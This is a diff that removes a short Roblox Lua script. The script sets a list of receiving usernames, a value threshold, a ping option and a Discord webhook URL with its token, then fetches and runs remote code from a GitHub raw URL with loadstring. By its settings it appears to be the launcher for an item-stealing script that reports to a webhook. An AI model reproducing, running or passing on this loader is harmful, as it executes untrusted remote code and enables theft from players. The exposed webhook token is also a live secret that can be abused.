@@ -1,7 +1,0 @@
-_G.Usernames = {"idkflashgagacc", "user2", "user3"} -- you can add as many as you'd like
-_G.min_value = 0.3
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1372155696941891634/Qa0z76wbT8otIHCEFVot9vSZdVY39x34Ix4vVJaeKULEEaypHegcMTr6jbD74NZR9sge" -- change to your webhook
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FlashScripts0/flashadmtest/refs/heads/main/main"))()
